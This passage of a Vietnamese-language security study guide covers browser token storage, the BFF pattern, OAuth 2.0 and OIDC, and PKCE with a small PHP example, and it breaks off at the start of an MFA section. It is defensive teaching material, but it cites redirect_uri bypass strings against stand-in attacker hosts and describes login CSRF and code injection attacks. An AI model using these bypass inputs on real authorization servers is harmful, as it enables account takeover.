3. *Acquisition of new tokens*: bỏ qua token hiện có, chèn iframe ẩn chạy một authorization code flow
   "im lặng" dựa trên session đăng nhập sẵn của user ở authorization server, lấy code và đổi thành
   **bộ token mới hoàn toàn**. Với public client chạy trong trình duyệt, RFC nói thẳng: không có cơ
   chế thực tế nào phía frontend chặn được, kể cả DPoP (kẻ tấn công dùng cặp key của chính hắn).
4. *Proxying requests*: không lấy token, cứ gửi request từ trình duyệt nạn nhân; trình duyệt tự đính
   cookie hoặc app tự đính token. Kịch bản này đúng với **mọi** web app, kể cả app chỉ dùng session
   cookie `HttpOnly`, và không chặn được bằng biện pháp ở tầng ứng dụng.

Kết luận quan trọng: nơi lưu token chỉ ảnh hưởng kịch bản 1 và 2. Kịch bản 3 và 4 thì nơi lưu nào
cũng thua. Bảng so sánh (tổng hợp từ RFC 10017 mục 8):

| Nơi lưu | JS độc đọc được? | Bị CSRF? | Ghi chú |
|---|---|---|---|
| `localStorage` | Có | Không (không tự gửi) | Chung mọi tab của origin, sống lâu, không đảm bảo mã hoá trên đĩa |
| `sessionStorage` | Có | Không | Như trên nhưng gắn với một tab, lộ ít hơn chút |
| IndexedDB | Có | Không | Chung giữa các tab và cả Service Worker |
| Biến trong memory (closure) | Khó hơn, không phải không thể | Không | Mất khi reload. Kẻ tấn công ghi đè hàm có sẵn (RFC gọi là *prototype poisoning*) để móc token ra khi closure gọi `fetch` |
| Web Worker / Service Worker giữ token | Không đọc trực tiếp được | Không | App phải nhờ worker thực hiện request. Vẫn thua kịch bản 3 |
| Cookie do JS tự set để đọc lại | Có | Có | RFC 10017: NOT RECOMMENDED, cookie còn tự gửi kèm mọi request tới domain |
| Cookie `HttpOnly` do server set | Không | Có, phải chống | Đây chính là session cookie; token nằm ở server (BFF) |

⚠️ Hai hiểu lầm phổ biến:

- "Để trong memory là an toàn trước XSS": sai. Nó chỉ làm khó kịch bản 1; kịch bản 3 và 4 vẫn chạy.
- "Cookie `HttpOnly` chống được XSS": nó chống XSS **đọc** cookie, không chống XSS **dùng** cookie
  (kịch bản 4). Lợi ích thật là kẻ tấn công chỉ phá được khi user đang mở trang, và không mang token
  đi dùng từ máy khác được.

Trên mobile, token lưu trong kho an toàn của hệ điều hành: Keychain (iOS), Keystore (Android), không
lưu vào file hay SharedPreferences dạng rõ.

#### BFF (Backend for Frontend)

*BFF* là một thành phần server-side thuộc về frontend: nó là OAuth client thay cho SPA. RFC 10017 (mục
6.1) định nghĩa ba trách nhiệm:

1. Làm việc với authorization server như một **confidential client** (có client secret hoặc key).
2. Giữ access token và refresh token trong session phía server, gắn với một cookie; **không bao giờ**
   đưa token xuống trình duyệt.
3. Nhận request từ SPA, gắn access token vào rồi chuyển tiếp tới resource server (API thật).

```text
 Trình duyệt (SPA)            BFF (cùng site)                 Authorization server / API
 ─────────────────            ───────────────                 ──────────────────────────
 (B) GET /bff/session ───────> có session không?
     <── chưa đăng nhập
 (C) điều hướng /bff/login ──> tạo state + PKCE
     <── 302 tới /authorize ───────────────────────────────> (D) user đăng nhập, đồng ý
 (E) /bff/callback?code=... ─> (F) đổi code + client secret
                                   + code_verifier ─────────> token endpoint
                                   <── access + refresh token
     <── (G) Set-Cookie: __Host-Http-sid=...; HttpOnly; Secure; SameSite=Strict
 (J) GET /bff/api/orders ────> tra session, lấy access token
     (kèm cookie)              (K) GET /orders ─────────────> resource server
                                   Authorization: Bearer ...
     <── (L) trả kết quả <──────── <── dữ liệu
```

Vì sao RFC 10017 gọi đây là mô hình an toàn nhất và "strongly recommended" cho ứng dụng nghiệp vụ,
ứng dụng nhạy cảm, ứng dụng xử lý dữ liệu cá nhân:

- Kịch bản 1 và 2 (trộm token): trình duyệt không có token nào để trộm.
- Kịch bản 3 (lấy token mới): BFF là confidential client. Kẻ tấn công có lấy được code qua iframe
  cũng không đổi được, vì không có client secret. PKCE chặn thêm các tấn công khác trên code.
- Còn lại kịch bản 4 (proxy qua trình duyệt, gọi là *client hijacking*): vốn có ở mọi web app, chỉ
  chặn được bằng cách không để JS độc chạy (CSP, output encoding, SRI). BFF lại là chỗ lý tưởng để
  đặt rate limit và phát hiện bất thường cho kịch bản này.

Các yêu cầu cụ thể của RFC 10017 cho BFF:

- Cookie: MUST `Secure`, MUST `HttpOnly`; SHOULD `SameSite=Strict`, `Path=/`, không đặt `Domain`, và
  tên có tiền tố `__Host-Http-` (tiền tố này khiến cookie không chia sẻ được với subdomain, chống
  session fixation qua subdomain).
- Nếu dùng *client-side session* (nhét token vào chính cookie, đã ký), SHOULD mã hoá nội dung cookie.
- MUST chống CSRF, vì mọi request dựa vào cookie. `SameSite=Strict` chưa đủ nếu có ứng dụng khác cùng
  *site* (cùng eTLD+1, ví dụ `a.example.com` và `b.example.com`): subdomain bị chiếm sẽ gửi được
  request "same-site". RFC gợi ý thêm: bắt buộc một **header tuỳ chỉnh** tĩnh (ví dụ `My-Static-Header: 1`)
  trên mọi request; request cross-origin có header tuỳ chỉnh luôn phải qua CORS preflight, nên trang
  lạ không gửi được. Hoặc dùng cơ chế double-submit cookie có sẵn của framework (chi tiết CSRF ở
  [module 2.7](#27-header-bảo-mật-csrf-hiện-đại-cors)).
- MUST giới hạn nơi chuyển tiếp: allowlist resource server và đường dẫn, nếu không kẻ tấn công lừa
  BFF gửi request (kèm access token) tới server của hắn.
- Session của BFF nên sống bằng hạn tối đa của refresh token; refresh token hết hiệu lực thì huỷ
  session.
- Vận hành: mọi request tới API đều đi từ IP của BFF, nên API rate limit theo IP sẽ chặn nhầm.

RFC 10017 còn mô tả hai mô hình yếu hơn, theo thứ tự an toàn giảm dần:

| Mô hình | Token ở đâu | Còn hở gì |
|---|---|---|
| BFF | Chỉ ở server | Kịch bản 4 (vốn có ở mọi web app) |
| *Token-mediating backend* | Refresh token ở server; access token đưa xuống JS, JS gọi API trực tiếp | Trộm access token (kịch bản 1, 2 cho access token) |
| *Browser-based OAuth client* | Mọi token ở JS, SPA là public client | Tất cả bốn kịch bản; RFC không khuyến nghị cho ứng dụng nghiệp vụ |

Đánh đổi của BFF: phải vận hành thêm một server, mọi request đi qua proxy (thêm độ trễ và tải), và
BFF thấy toàn bộ dữ liệu qua lại (vấn đề riêng tư nếu BFF do bên thứ ba cung cấp).

#### Chọn session hay token

RFC 10017 (mục 7.1) có một ý mà người phỏng vấn thích nghe: nhiều ứng dụng tự làm phức tạp khi dùng
OAuth thay cho quản lý session. Nếu frontend và API cùng một domain, dùng session cookie phía server
là đủ; OIDC chỉ cần cho việc đăng nhập bằng nhà cung cấp danh tính bên ngoài.

| Tình huống | Lựa chọn thường hợp lý | Lý do |
|---|---|---|
| Web app một domain (Blade, Inertia, SPA cùng site) | Session cookie `HttpOnly` (Laravel session, Sanctum SPA mode) | Thu hồi tức thì, không có token ở JS |
| SPA gọi API bên thứ ba qua OAuth | BFF | RFC 10017 |
| Mobile app | Access token ngắn + refresh token có rotation, lưu Keychain/Keystore | Không có cookie jar kiểu trình duyệt |
| Nhiều service verify độc lập | JWT ký bất đối xứng (ES256), access token ngắn | Service tự verify bằng public key |
| Service-to-service | Client credentials (module 2.3), JWT ký bất đối xứng, hoặc *mTLS* (hai bên cùng xuất trình certificate TLS) | Không có user |

Trong Laravel: Sanctum SPA mode dùng session cookie cùng CSRF, Sanctum token mode phát token lưu hash
trong DB, Passport là OAuth2 server đầy đủ. Chi tiết ở
[05-php-laravel.md#27-các-thành-phần-khác-của-laravel](05-php-laravel.md#27-các-thành-phần-khác-của-laravel)
và [module 2.8](#28-tầng-phplaravel).

**Tóm tắt nhanh**
- JWT không thu hồi được trước `exp` nếu chỉ verify chữ ký. Cách nền: access token ngắn + refresh
  token lưu server; muốn tức thì thì `token_version` hoặc denylist `jti`, và chấp nhận mất tính
  stateless.
- Rotation: mỗi lần refresh phát token mới, token cũ dùng lại là thu hồi cả family. Không kéo dài hạn
  tuyệt đối khi xoay. Hai tab refresh cùng lúc cần grace period hoặc đồng bộ client.
- JS độc có cùng quyền với app: trộm token trong storage, và còn tự chạy flow mới để lấy token mới.
  Nơi lưu nào trong trình duyệt cũng không chặn được việc sau.
- BFF: backend là confidential client giữ token, trình duyệt chỉ có cookie `__Host-` `HttpOnly`
  `Secure` `SameSite=Strict`. RFC 10017 khuyến nghị mạnh cho ứng dụng nghiệp vụ.
- Web app một domain: session cookie thường là câu trả lời đúng, đừng dựng OAuth khi không cần.

**Nguồn**: [RFC 10017: OAuth 2.0 for Browser-Based Applications](https://www.rfc-editor.org/rfc/rfc10017) ·
[RFC 9700 mục 4.14](https://www.rfc-editor.org/rfc/rfc9700#section-4.14) ·
[Auth0: Refresh Token Rotation](https://auth0.com/docs/secure/tokens/refresh-tokens/refresh-token-rotation) ·
[Auth0: Configure Refresh Token Rotation](https://auth0.com/docs/secure/tokens/refresh-tokens/configure-refresh-token-rotation) ·
[OWASP: JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html)


---

### 2.3 OAuth 2.0 và OIDC

Module này trả lời: OAuth 2.0 giải bài toán gì (và không giải bài toán gì), authorization code +
PKCE chạy từng bước ra sao, các tham số `state`, `code_challenge`, `nonce`, `iss` mỗi cái chặn tấn
công nào, và OIDC thêm gì để OAuth dùng được cho đăng nhập.

#### OAuth 2.0 là gì

OAuth 2.0 (RFC 6749) là giao thức **ủy quyền** (*delegated authorization*): user cho phép một ứng
dụng truy cập tài nguyên của mình ở một hệ khác, mà **không đưa password** cho ứng dụng đó. Ví dụ
kinh điển: app in ảnh xin quyền đọc Google Photos của bạn. Trước OAuth, cách duy nhất là đưa password
Google cho app in ảnh, và app đó có toàn quyền, vĩnh viễn, không thu hồi riêng được.

Bốn vai trò:

| Vai trò | Là ai | Ví dụ |
|---|---|---|
| *Resource owner* | Chủ dữ liệu, thường là user | Bạn |
| *Client* | Ứng dụng muốn truy cập | App in ảnh |
| *Authorization server* (AS) | Nơi user đăng nhập, đồng ý, và phát token | `accounts.google.com` |
| *Resource server* (RS) | API giữ dữ liệu, nhận access token | Google Photos API |

Kết quả của OAuth là một *access token*: chuỗi mà RS chấp nhận, mang theo *scope* (phạm vi quyền,
ví dụ `photos.read`). Kiểu phổ biến là *bearer token* (RFC 6750): ai cầm token là dùng được, giống
tiền mặt. Vì thế token phải bị giới hạn: sống ngắn, scope hẹp, và gắn *audience* (chỉ một RS chấp
nhận). RFC 9700 mục 2.3 yêu cầu RS kiểm tra, với mọi request, token có đúng là được phát cho mình
không.

Phân loại client quan trọng cho mọi quyết định bên dưới:

- *Confidential client*: có backend giữ được secret (client secret, private key). Ví dụ: web app
  Laravel render server-side, BFF ([module 2.2](#22-vòng-đời-token-revocation-refresh-nơi-lưu-bff)).
- *Public client*: không giữ được secret, vì code nằm trên máy user. Ví dụ: SPA, mobile app, CLI.
  Secret nhúng trong app mobile là secret đã lộ.

⚠️ OAuth 2.0 **không phải** giao thức đăng nhập. Nó trả lời "app này được làm gì", không trả lời "user
đang ngồi trước màn hình là ai". Đăng nhập là việc của OIDC (nhóm dưới).

#### Các flow

Trong OAuth gọi là *grant type*: cách client đổi một thứ gì đó lấy access token.

| Flow | Dùng khi | Ghi chú |
|---|---|---|
| Authorization code + PKCE | Mọi app có user: web, SPA, mobile | Flow mặc định. RFC 9700 yêu cầu PKCE cho public client, khuyến nghị cho confidential client |
| Client credentials | Server gọi server, không có user | Client tự xác thực bằng secret hoặc key, nhận token cho chính nó |
| Device authorization (RFC 8628) | TV, CLI, thiết bị không có trình duyệt tiện dụng | Thiết bị hiện mã, user nhập mã ở điện thoại |
| Refresh token | Lấy access token mới khi cái cũ hết hạn | Xem [module 2.2](#22-vòng-đời-token-revocation-refresh-nơi-lưu-bff) |
| Implicit | ⚠️ Không dùng | RFC 9700: SHOULD NOT. OAuth 2.1 (còn là draft) bỏ hẳn |
| Password (ROPC) | ⚠️ Không dùng | RFC 9700: MUST NOT. OAuth 2.1 bỏ hẳn |

*Device authorization* từng bước: thiết bị gọi AS xin `device_code` (giữ bí mật) và `user_code` (mã
ngắn cho người đọc) cùng `verification_uri`; màn hình TV hiện "vào example.com/device, nhập WDJB-MJHT";
user nhập mã trên điện thoại và đồng ý; trong lúc đó thiết bị *poll* (hỏi lặp) token endpoint. AS trả
`authorization_pending` khi user chưa xong, `slow_down` khi thiết bị hỏi quá nhanh (phải tăng khoảng
cách thêm 5 giây). Không có `interval` trong response thì mặc định chờ 5 giây giữa hai lần hỏi.

Vì sao *ROPC* (client nhận thẳng username/password của user rồi đổi lấy token) bị cấm, theo RFC 9700
mục 2.4: lộ password cho client, tăng số nơi password có thể rò, tập cho user thói quen gõ password ở
chỗ không phải AS (đúng thứ phishing cần), và không tương thích với MFA hay WebAuthn. Laravel Passport
docs cũng ghi rõ không còn khuyến nghị password grant và implicit grant (hai grant này phải bật tay
bằng `Passport::enablePasswordGrant()` và `Passport::enableImplicitGrant()`).

#### Authorization code + PKCE từng bước

Hai kênh cần phân biệt, vì toàn bộ thiết kế xoay quanh chúng:

- *Front-channel*: dữ liệu đi qua trình duyệt, qua URL redirect. Lọt được vào history, log, header
  `Referer`, extension của trình duyệt, và kẻ tấn công có thể sửa được.
- *Back-channel*: server của client gọi thẳng token endpoint qua TLS. Không qua trình duyệt.

Nguyên tắc: qua front-channel chỉ gửi thứ **ngắn hạn, dùng một lần, và vô dụng nếu đứng một mình**
(authorization code). Token thật chỉ đi qua back-channel.

```text
 Client (server)               Trình duyệt                   Authorization server
 ───────────────               ───────────                   ────────────────────
 1. sinh state, code_verifier
    challenge = BASE64URL(SHA256(verifier))
    lưu state + verifier vào session
                  ── 302 ──>  2. GET /authorize?response_type=code
                                 &client_id=...&redirect_uri=...
                                 &scope=openid email&state=...
                                 &code_challenge=...&code_challenge_method=S256  ──>  (front)
                                                             3. user đăng nhập, đồng ý
                              <── 302 redirect_uri?code=...&state=...&iss=...  ──  4. (front)
 5. kiểm tra state, iss
    POST /token: code, redirect_uri, code_verifier,
    client_id (+ client secret nếu confidential)  ────────────────────────────>  (back)
                                                             6. SHA256(verifier) khớp challenge?
                                                                code chưa dùng? redirect_uri khớp?
 <──────────────────────────  access_token, (refresh_token), (id_token)  ─────  (back)
```

*PKCE* (Proof Key for Code Exchange, RFC 7636, đọc là "pixy") chạy thế nào:

- `code_verifier`: chuỗi ngẫu nhiên 43–128 ký tự (chữ, số, `-`, `.`, `_`, `~`). RFC 7636 gợi ý sinh
  32 byte ngẫu nhiên rồi base64url, ra 43 ký tự.
- `code_challenge = BASE64URL(SHA256(code_verifier))`, method `S256`. Method `plain` (challenge bằng
  chính verifier) chỉ để tương thích; RFC 9700 nói nên dùng method không để lộ verifier trong
  request, và hiện chỉ `S256` đáp ứng.
- AS lưu challenge cùng code. Ở bước 6, ai mang code tới cũng phải đưa verifier khớp. Kẻ chỉ nhìn
  thấy front-channel (có challenge, có code) không suy ngược ra verifier được, vì SHA-256 một chiều.

```php
<?php
declare(strict_types=1);

function base64url(string $bytes): string
{
    return rtrim(strtr(base64_encode($bytes), '+/', '-_'), '=');
}

$verifier  = base64url(random_bytes(32));                 // 32 byte -> 43 ký tự
$challenge = base64url(hash('sha256', $verifier, true));  // true: lấy bytes thô, không phải hex

echo strlen($verifier), "\n";                             // 43

// Tự kiểm bằng vector mẫu ở RFC 7636 Appendix B
echo base64url(hash('sha256', 'dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk', true)), "\n";
// E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
```

⚠️ Lỗi hay gặp: `hash('sha256', $v)` không có tham số thứ ba trả về chuỗi **hex** 64 ký tự; base64 của
chuỗi hex là sai và AS sẽ từ chối.

PKCE chặn hai tấn công (RFC 7636 mục 1 cho tấn công đầu, RFC 9700 mục 4.5 cho tấn công sau):

1. *Code interception* với public client: kẻ lấy được code (qua log, `Referer`, app độc đăng ký cùng
   custom URL scheme trên mobile) đem đổi lấy token. Không có verifier thì thất bại.
2. *Authorization code injection* với confidential client: kẻ tấn công trộm được code của nạn nhân,
   tự bắt đầu một flow bình thường với client thật trên máy mình, rồi **tráo** code của nạn nhân vào
   response ở bước 4. Client thật đổi code bằng secret thật (nên client secret không cứu được), và
   phiên của kẻ tấn công gắn với tài khoản nạn nhân. Với PKCE, client gửi verifier của phiên kẻ tấn
   công, không khớp challenge gắn với code của nạn nhân, AS từ chối.

Các yêu cầu phía AS (RFC 9700 mục 2.1.1): MUST hỗ trợ PKCE; nếu request có `code_challenge` thì MUST
bắt verifier đúng; và chống *PKCE downgrade*: nếu authorization request **không có** challenge mà token
request lại **có** `code_verifier` thì MUST từ chối. Kẻ tấn công xoá `code_challenge` khỏi request của
chính hắn để có code "không gắn PKCE", rồi tiêm code đó vào phiên nạn nhân; client nạn nhân gửi kèm
verifier của mình, AS dễ dãi bỏ qua verifier và chấp nhận. AS bắt buộc PKCE cho mọi client thì tự
động miễn nhiễm.

Implicit flow (`response_type=token`) bị bỏ vì (RFC 9700 mục 2.1.2, RFC 10017 mục 7.2):

- Access token trả thẳng trên URL (fragment `#access_token=...`), lọt vào lịch sử trình duyệt và bị
  script hay extension trong trang đọc được. Fragment không được gửi lên server, kể cả trong `Referer`.
- Không gắn được token với client (không sender-constrain được), nên token lộ là dùng được ngay.
- Kẻ tấn công tiêm được access token của người khác vào response (*access token injection*), client
  không có cách phát hiện trong OAuth thuần.
- Client không kiểm chứng được access token có phải phát cho mình không.

Lý do lịch sử của implicit (RFC 10017 mục 7.2.1): trước khi CORS phổ biến, JS không gọi được token
endpoint ở domain khác; và JS xoá được fragment khỏi URL mà không reload trang. Ngày nay CORS có ở mọi
trình duyệt, Session History API cho xoá `?code=` khỏi URL không cần reload, nên SPA dùng code + PKCE
như mọi client khác.

#### Các cạm bẫy ở callback

*`state` và CSRF trên callback*. Tấn công (còn gọi là *login CSRF* hoặc chiếm liên kết tài khoản):

1. Kẻ tấn công bắt đầu flow với tài khoản Google **của hắn**, dừng lại trước bước 4 và lấy URL
   callback `https://app.com/callback?code=CODE_CỦA_HẮN`.
2. Lừa nạn nhân (đang đăng nhập app.com) mở URL đó, qua một thẻ `<img>` hay link.
3. app.com đổi code, và liên kết tài khoản Google của kẻ tấn công vào tài khoản app.com của nạn nhân.
   Từ đó kẻ tấn công "Đăng nhập bằng Google" là vào được tài khoản nạn nhân.

`state` chặn bằng cách: client sinh giá trị ngẫu nhiên, lưu trong session của **chính trình duyệt
đó**, gửi đi ở bước 2 và so ở bước 5. Callback mang `state` không khớp session thì huỷ. RFC 9700 mục
2.1 nói thêm: nếu đã chắc AS hỗ trợ PKCE thì client được phép dựa vào PKCE để chống CSRF (verifier
nằm trong session trình duyệt, code của kẻ tấn công không khớp); trong OIDC, `nonce` cũng cho bảo vệ
tương tự. Nếu không có hai thứ đó, `state` dùng một lần, gắn với trình duyệt là **bắt buộc**.

So sánh để trả lời câu "PKCE chặn gì mà `state` không chặn, và ngược lại":

| Tấn công | `state` | PKCE | `nonce` (OIDC) |
|---|---|---|---|
| CSRF trên callback (tiêm code của kẻ tấn công vào phiên nạn nhân) | Chặn | Chặn (nếu AS hỗ trợ PKCE) | Chặn |
| Trộm code rồi tự đổi lấy token (public client) | Không | Chặn | Không |
| Trộm code của nạn nhân rồi tiêm vào phiên của kẻ tấn công (code injection) | Không, kẻ tấn công có `state` hợp lệ của phiên hắn | Chặn | Chặn (nếu client kiểm `nonce` trong ID token từ token endpoint) |
| PKCE downgrade ở AS dễ dãi | Chặn (client kiểm `state` đúng) | Không, nếu AS không chống downgrade | |
| Kẻ tấn công đọc được response (thấy `state`) | Không, hắn phát lại được `state` | Chặn | |

Ý chính: `state` bảo vệ **phía client** ("callback này có phải do tôi khởi tạo không"), PKCE bảo vệ
**phía AS** ("người đổi code có phải người đã xin code không"). Làm cả hai.

⚠️ *`redirect_uri` phải so khớp chính xác*. RFC 9700 mục 4.1: AS MUST so chuỗi chính xác với URI đã
đăng ký (ngoại lệ duy nhất: cổng của `localhost` cho native app). So theo prefix, wildcard hoặc regex
đã gây nhiều vụ chiếm tài khoản ngoài thực tế:

- Đăng ký `https://*.somesite.example/*`, AS hiểu `*` là "ký tự bất kỳ" và chấp nhận
  `https://attacker.example/.somesite.example` (ví dụ trong RFC 9700).
- So prefix `https://app.com` thì `https://app.com.evil.com/` cũng qua.
- Wildcard subdomain đúng nghĩa vẫn nguy hiểm: một subdomain bị chiếm (CNAME trỏ tới dịch vụ đã huỷ,
  *subdomain takeover*) là nhận được code.
- PortSwigger liệt kê thêm các kỹ thuật lách: thêm path `../`, lợi dụng khác biệt giữa các parser URL
  (`https://default-host.com&@foo.evil-user.net#@bar.evil-user.net/`), gửi hai tham số
  `redirect_uri` (*parameter pollution*), và các domain kiểu `localhost.evil-user.net`.

Ngay cả khi so chính xác, code vẫn lọt được nếu trang callback (hoặc trang cùng domain được đăng ký)
có *open redirect* (trang chuyển hướng theo tham số URL) hay XSS, hoặc tải ảnh từ domain lạ khiến URL
chứa code nằm trong header `Referer`. RFC 9700 cấm client và AS có open redirector.

*Mix-up attack* (RFC 9700 mục 4.4): client hỗ trợ nhiều AS (Google, GitHub, và một AS do kẻ tấn công
dựng hoặc chiếm được). User chọn AS độc; AS độc lập tức chuyển hướng sang AS thật với `client_id` của
client ở AS thật; user đồng ý ở AS thật; code quay về client, nhưng client vẫn tưởng đang làm với AS
độc nên gửi code tới **token endpoint của AS độc**. Kẻ tấn công có code. Chặn: client lưu "đã gửi
request tới issuer nào" trong session, và AS trả tham số `iss` trong response (RFC 9207, ví dụ
`...?code=...&state=...&iss=https%3A%2F%2Fhonest.as.example`); không khớp thì huỷ. Với OIDC, dùng claim
`iss` trong ID token. Client chỉ dùng đúng một AS thì không cần phòng mix-up.

Checklist callback phía client, theo thứ tự:

1. `state` khớp giá trị trong session, rồi xoá khỏi session (dùng một lần).
2. `iss` (nếu có) khớp issuer đã lưu cho request này.
3. Có `error` thì xử lý lỗi, không đi tiếp.
4. Đổi code ở back-channel, gửi đúng `redirect_uri` đã dùng và `code_verifier`.
5. Nếu OIDC: validate ID token (nhóm dưới) trước khi dùng bất kỳ token nào.

#### OIDC: lớp đăng nhập trên OAuth

*OpenID Connect* (OIDC) là lớp danh tính trên OAuth 2.0. Trong OIDC, client gọi là *Relying Party*
(RP), AS gọi là *OpenID Provider* (OP). Thêm ba thứ:

1. Scope `openid`: có nó thì request là một authentication request, và token response có thêm
   **ID token**. Scope phụ như `profile`, `email` xin thêm thông tin.
2. *ID token*: một JWT **bắt buộc được ký**, nói "user nào, xác thực lúc nào, bởi ai, cho client nào".
3. Discovery và userinfo: `https://issuer/.well-known/openid-configuration` trả JSON chứa mọi endpoint
   (authorization, token, userinfo) và `jwks_uri` (URL chứa public key để verify chữ ký). Endpoint
   `userinfo` nhận access token và trả thêm thông tin user.

Các claim trong ID token (OIDC Core mục 2):

| Claim | Ý nghĩa |
|---|---|
| `iss` | Issuer, URL `https` của OP |
| `sub` | Id của user, duy nhất trong phạm vi issuer và **không bao giờ gán lại** cho người khác, tối đa 255 ký tự ASCII |
| `aud` | Phải chứa `client_id` của RP |
| `exp`, `iat` | Hết hạn, thời điểm phát |
| `auth_time` | Lúc user thực sự xác thực (bắt buộc khi request có `max_age`) |
| `nonce` | Giá trị client gửi trong request, OP chép nguyên vào token |
| `acr`, `amr` | Mức độ xác thực và phương thức đã dùng (ví dụ có MFA không) |

Validate ID token (OIDC Core mục 3.1.3.7), tóm tắt:

1. `iss` khớp **chính xác** issuer (lấy từ discovery).
2. `aud` chứa `client_id` của mình; từ chối nếu có audience khác mà mình không tin.
3. Chữ ký hợp lệ bằng key của issuer (qua JWKS), thuật toán cố định phía mình ([module 2.1](#21-jwt)).
   Ngoại lệ trong spec: ID token nhận trực tiếp từ token endpoint qua TLS thì được phép dựa vào việc
   xác thực TLS server thay cho kiểm chữ ký; nhiều thư viện vẫn kiểm chữ ký, và đó là lựa chọn an toàn.
4. Thời điểm hiện tại trước `exp` (cho lệch đồng hồ nhỏ, spec nói thường không quá vài phút).
5. Nếu đã gửi `nonce` thì claim `nonce` phải có và khớp.
6. Nếu có yêu cầu `acr` hay `max_age` thì kiểm tra `acr`, `auth_time`.

⚠️ ID token và access token khác nhau về **người nhận**:

| | ID token | Access token |
|---|---|---|
| Người đọc | Client (RP) | Resource server |
| `aud` | `client_id` của client | Resource server |
| Nói gì | User nào đã đăng nhập, lúc nào, bằng cách nào | Bên cầm token được làm gì (scope) |
| Định dạng | Luôn là JWT | Tuỳ AS: JWT (RFC 9068) hoặc chuỗi ngẫu nhiên, client không nên phân tích |
| Gửi tới API? | Không | Có |

⚠️ Vì sao "đăng nhập bằng OAuth" mà chỉ dùng access token là sai: access token là dành cho resource
server, client không có cách chuẩn nào kiểm chứng token có được phát **cho mình** không (RFC 10017 mục
7.2.4). Kịch bản tấn công: kẻ tấn công dựng app X hợp lệ, user đăng nhập Google vào X, X có access
token của user. X đem token đó gửi tới app Y, nơi "đăng nhập" bằng cách gọi `/userinfo` với access
token nhận được rồi tin kết quả. Y thấy "đây là user A" và cho X vào tài khoản A trên Y. ID token
chặn được vì `aud` của nó là `client_id` của X, Y kiểm `aud` thấy không phải mình. Dạng biến thể mà
PortSwigger mô tả: client dùng implicit flow, nhận token rồi POST `user_id` + `access_token` lên server
của mình, server tin `user_id` mà không đối chiếu với token, sửa `user_id` là thành người khác.

⚠️ Định danh user bằng cặp `(iss, sub)`, **không** bằng email. PortSwigger mô tả lỗi *unverified user
registration*: OP cho đăng ký không cần xác minh email, kẻ tấn công đăng ký bằng email của nạn nhân,
client ghép tài khoản theo email và cho kẻ tấn công vào. Chỉ liên kết theo email khi OP xác nhận email
đã được xác minh (claim `email_verified`) và bạn tin OP đó.

Một lỗi phía AS nữa từ PortSwigger: *scope upgrade*, AS không kiểm scope trong token request so với
scope user đã đồng ý, client độc xin `openid email` rồi đổi code với `scope=openid email profile`.

#### Trong Laravel

- *Passport*: OAuth2 **authorization server** đầy đủ, xây trên `league/oauth2-server`. Dùng khi app
  của bạn cho bên thứ ba truy cập (bạn là "Google"). Tạo public client cho PKCE bằng
  `php artisan passport:client --public`. Code mẫu trong docs sinh `state` bằng `Str::random(40)`,
  verifier bằng `Str::random(128)`, và kiểm `state` bằng `===` trước khi đổi code.
- ⚠️ Passport mặc định phát access token **sống một năm**. Đặt lại bằng `Passport::tokensExpireIn()`,
  `Passport::refreshTokensExpireIn()` trong `AppServiceProvider::boot()`. Docs còn cảnh báo cột
  `expires_at` trong DB chỉ để hiển thị; muốn vô hiệu token thì `revoke()`.
- *Sanctum* không phải OAuth: docs Laravel nói nếu cần OAuth2 thì dùng Passport, còn SPA của chính
  mình, mobile app, hay API token đơn giản thì dùng Sanctum.
- *Socialite*: phía **client**, dùng để "Đăng nhập bằng Google/GitHub". Socialite tự quản `state`
  trong session; gọi `stateless()` là tắt kiểm tra đó, chỉ nên dùng khi có cơ chế khác thay thế.

Chi tiết Sanctum ở [05-php-laravel.md#27-các-thành-phần-khác-của-laravel](05-php-laravel.md#27-các-thành-phần-khác-của-laravel)
và [module 2.8](#28-tầng-phplaravel).

**Tóm tắt nhanh**
- OAuth là ủy quyền, OIDC là đăng nhập. Đăng nhập phải dựa trên ID token đã validate (`iss`, `aud`,
  chữ ký, `exp`, `nonce`), không dựa trên access token.
- Flow mặc định: authorization code + PKCE `S256` cho mọi client. Implicit và password grant không
  dùng nữa.
- `state` bảo vệ client khỏi callback giả (CSRF); PKCE bảo vệ AS khỏi người đổi code không phải
  người xin code (interception, injection). Làm cả hai.
- `redirect_uri` so khớp chính xác; không open redirect; nhiều AS thì kiểm `iss` chống mix-up.
- Định danh user bằng `(iss, sub)`, không bằng email. Passport mặc định token sống một năm, đặt lại.

**Nguồn**: [RFC 9700: OAuth 2.0 Security BCP](https://www.rfc-editor.org/rfc/rfc9700) ·
[RFC 7636: PKCE](https://www.rfc-editor.org/rfc/rfc7636) · [RFC 9207](https://www.rfc-editor.org/rfc/rfc9207) ·
[RFC 8628](https://www.rfc-editor.org/rfc/rfc8628) ·
[RFC 10017](https://www.rfc-editor.org/rfc/rfc10017) ·
[OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html) ·
[PortSwigger: OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth) ·
[OWASP: OAuth 2.0 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html) ·
[Laravel: Passport](https://laravel.com/docs/passport)


---

### 2.4 MFA và passkey

Module này trả lời: MFA gồm những yếu tố nào, TOTP chạy thế nào và cài đặt đúng ra sao, vì sao SMS
yếu, passkey (WebAuthn) chống phishing bằng cơ chế gì mà OTP không có, và làm sao để luồng khôi phục
tài khoản không biến MFA thành đồ trang trí.

#### MFA là gì

*MFA* (Multi-Factor Authentication, hay *2FA* khi đúng hai yếu tố) là yêu cầu user đưa ra **nhiều loại
bằng chứng khác nhau**. OWASP MFA Cheat Sheet liệt kê năm loại, ba loại đầu phổ biến trên web:

| Yếu tố | Ví dụ |
|---|---|
| Thứ bạn biết | Password, PIN, câu hỏi bảo mật |
| Thứ bạn có | Điện thoại chạy app TOTP, khoá bảo mật (YubiKey), certificate, smart card |
| Thứ bạn là | Vân tay, khuôn mặt |
| Nơi bạn ở | IP nguồn, vị trí địa lý |
| Việc bạn làm | Hành vi gõ phím, di chuột |

⚠️ Hai thứ cùng loại **không phải** MFA: password + PIN, hay password + câu hỏi bảo mật, đều là "thứ
bạn biết" và bị cùng một cách tấn công lấy mất. Các yếu tố phải độc lập.

Vì sao đáng làm: cách phổ biến nhất để chiếm tài khoản là password yếu, dùng lại, hoặc bị lộ (xem
